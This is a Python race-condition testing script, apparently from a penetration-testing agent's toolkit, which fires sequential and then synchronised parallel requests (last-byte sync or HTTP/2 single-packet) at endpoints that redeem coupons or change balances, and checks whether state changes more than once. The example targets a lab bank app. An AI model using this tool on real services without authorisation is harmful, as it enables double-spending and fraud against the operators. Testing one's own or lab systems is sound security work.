#!/usr/bin/env python3
"""Race-condition proof on a one-shot resource the agent created itself (own coupon, own balance, own invite).

Protocol per repeat: setup -> sequential wave (N requests one after another; a correct app allows 1) ->
setup again -> parallel wave (N requests released together). Proof = sequential 1 success vs parallel >1,
plus the authoritative state (--state-url) moving by more than one unit. Repeats default 2, N capped at 20.

--setup is a shell command that creates a fresh one-shot resource and prints its id/code on stdout;
the value replaces {{R}} in --url, --data and --state-url. Without --setup only one wave runs (--mode).

Parallel engines:
  h2       HTTP/2 single-packet attack via h2spacex (pip install h2spacex; NOT in the toolbox image and
           unverified here). Per-response parsing is not attempted: proof comes from --state-url.
  threads  stdlib fallback: N connections opened up front, all but the last byte sent, then a barrier
           releases the last bytes together (last-byte sync over HTTP/1.1).
  auto     h2 if h2spacex imports and the URL is https, else threads.

  scripts/mythos python3 skills/business-logic/scripts/race.py \
    --headers engagements/<dir>/sessions/userA.headers --method POST \
    --url http://vuln-bank-web:5000/api/redeem --data '{"code":"{{R}}"}' \
    --setup "curl -s ... | jq -r .code" --success-regex '"success": *true' \
    --state-url http://vuln-bank-web:5000/api/balance --n 10 --out engagements/<dir>/scan/race.jsonl
"""
import argparse, http.client, json, re, socket, ssl, subprocess, sys, threading, time, urllib.parse
from pathlib import Path


def load_headers(path):
    return dict(l.split(": ", 1) for l in Path(path).read_text().splitlines() if ": " in l) if path else {}


def raw_request(method, url, headers, body):
    u = urllib.parse.urlsplit(url)
    path = (u.path or "/") + ("?" + u.query if u.query else "")
    h = {"Host": u.netloc, "Connection": "close", **headers}
    if body is not None:
        h.setdefault("Content-Type", "application/json")
        h["Content-Length"] = str(len(body.encode()))
    head = f"{method} {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in h.items()) + "\r\n"
    return u, (head + (body or "")).encode()


def connect(u):
    port = u.port or (443 if u.scheme == "https" else 80)
    s = socket.create_connection((u.hostname, port), timeout=20)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if u.scheme == "https":
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=u.hostname)
    return s


def read(s):
    r = http.client.HTTPResponse(s)
    try:
        r.begin()
        return r.status, r.read().decode(errors="replace")
    except (OSError, http.client.HTTPException) as e:
        return 0, str(e)
    finally:
        s.close()


def ok(status, body, a):
    return bool(re.search(a.success_regex, body)) if a.success_regex else status in a.success_status


def wave_seq(a, url, body, headers):
    out = []
    for _ in range(a.n):
        u, raw = raw_request(a.method, url, headers, body)
        s = connect(u); s.sendall(raw)
        out.append(read(s))
    return out


def wave_threads(a, url, body, headers):
    u, raw = raw_request(a.method, url, headers, body)
    socks = [connect(u) for _ in range(a.n)]
    for s in socks:
        s.sendall(raw[:-1])
    barrier, res = threading.Barrier(a.n), [None] * a.n

    def go(i):
        barrier.wait()
        socks[i].sendall(raw[-1:])
        res[i] = read(socks[i])
    ts = [threading.Thread(target=go, args=(i,)) for i in range(a.n)]
    for t in ts: t.start()
    for t in ts: t.join()
    return res


def wave_h2(a, url, body, headers):
    # ponytail: written from the h2spacex README examples, not run here; verify on a lab target first.
    from h2spacex import H2OnTlsConnection, h2_frames
    u = urllib.parse.urlsplit(url)
    path = (u.path or "/") + ("?" + u.query if u.query else "")
    c = H2OnTlsConnection(hostname=u.hostname, port_number=u.port or 443)
    c.setup_connection()
    hs = "".join(f"{k}: {v}\n" for k, v in {**headers, **({"content-type": "application/json"} if body else {})}.items())
    heads, datas = b"", b""
    for sid in c.generate_stream_ids(number_of_streams=a.n):
        h, d = c.create_single_packet_http2_post_request_frames(
            method=a.method, headers_string=hs, scheme="https", stream_id=sid,
            authority=u.hostname, body=body or "", path=path)
        heads += bytes(h); datas += bytes(d)
    c.send_bytes(heads); time.sleep(0.1); c.send_ping_frame(); c.send_bytes(datas)
    fp = h2_frames.FrameParser(h2_connection=c)
    fp.add_frames(c.read_response_from_socket(_timeout=3))
    fp.show_response_of_sent_requests()
    return None  # success count unknown on this engine; rely on --state-url


def state(a, headers, r):
    if not a.state_url:
        return None
    u, raw = raw_request("GET", a.state_url.replace("{{R}}", r), headers, None)
    s = connect(u); s.sendall(raw)
    return read(s)[1][:500]


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--headers")
    ap.add_argument("--method", default="POST")
    ap.add_argument("--url", required=True)
    ap.add_argument("--data")
    ap.add_argument("--setup", help="shell cmd printing a fresh one-shot resource value for {{R}}")
    ap.add_argument("--mode", choices=("seq", "par"), help="single wave when no --setup")
    ap.add_argument("--engine", choices=("auto", "h2", "threads"), default="auto")
    ap.add_argument("--n", type=int, default=10)
    ap.add_argument("--repeats", type=int, default=2)
    ap.add_argument("--success-status", type=int, nargs="+", default=[200, 201])
    ap.add_argument("--success-regex")
    ap.add_argument("--state-url", help="authoritative state read (balance, usage count)")
    ap.add_argument("--out", required=True)
    a = ap.parse_args()
    if not 2 <= a.n <= 20:
        sys.exit("race: --n must be 2..20 (minimal side effects)")
    if not a.setup and not a.mode:
        sys.exit("race: give --setup (full protocol) or --mode seq|par (one wave)")
    engine = a.engine
    if engine == "auto":
        try:
            import h2spacex  # noqa: F401
            engine = "h2" if a.url.startswith("https") else "threads"
        except ImportError:
            engine = "threads"
    headers = load_headers(a.headers)
    waves = ["seq", "par"] * a.repeats if a.setup else [a.mode]
    out, summary = open(a.out, "a"), []
    for w in waves:
        r = ""
        if a.setup:
            sp = subprocess.run(a.setup, shell=True, capture_output=True, text=True)
            if sp.returncode:
                sys.exit(f"race: --setup exited {sp.returncode}, no resource to race:\n{sp.stderr.strip()}")
            r = sp.stdout.strip()
        url, body = a.url.replace("{{R}}", r), a.data.replace("{{R}}", r) if a.data else None
        before = state(a, headers, r)
        if w == "seq":
            res = wave_seq(a, url, body, headers)
        else:
            res = (wave_h2 if engine == "h2" else wave_threads)(a, url, body, headers)
        after = state(a, headers, r)
        wins = None if res is None else sum(ok(s, b, a) for s, b in res)
        rec = {"wave": w, "engine": "sequential" if w == "seq" else engine, "resource": r, "n": a.n,
               "successes": wins, "statuses": None if res is None else [s for s, _ in res],
               "first_body": None if res is None else res[0][1][:300], "state_before": before, "state_after": after}
        out.write(json.dumps(rec) + "\n")
        summary.append((w, wins))
        print(json.dumps({k: rec[k] for k in ("wave", "engine", "successes", "statuses")}))
    seq = [x for w, x in summary if w == "seq"]
    par = [x for w, x in summary if w == "par"]
    if seq and par and None not in par:
        hit = all(s == 1 for s in seq) and all(p > 1 for p in par)
        print(json.dumps({"verdict": "reproduced" if hit else "not-reproduced", "seq": seq, "par": par,
                          "next": "check state_before/after in --out; a race is a finding only if the "
                                  "authoritative state moved by more than one unit"}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
